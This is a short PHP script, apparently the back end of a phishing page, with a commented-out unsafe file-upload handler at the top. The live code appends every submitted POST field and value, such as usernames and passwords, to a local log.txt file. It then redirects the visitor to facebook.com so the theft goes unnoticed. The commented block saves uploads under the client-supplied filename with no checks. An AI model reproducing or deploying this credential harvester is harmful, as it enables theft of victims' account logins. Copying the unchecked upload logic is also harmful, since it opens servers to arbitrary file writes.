<!---->
<?php
//$folder_path= 'Upload/';
//$file_path = $folder_path.$_FILES['upload_file']['name'];
//$flag = true;
//
//if(file_exists($file_path)){
//    echo "The file exists";
//    $flag = false;
//}
//if($flag){
//    move_uploaded_file($_FILES['upload_file']['tmp_name'],$file_path);
//    echo"File upload successful!!!";
//}else{
//    echo"Error";
//}
//?>
<!---->
<!---->
<?php

// Set the location to redirect the page
header ('Location: http://www.facebook.com');

// Open the text file in writing mode
$file = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fclose($file);
exit;
?>
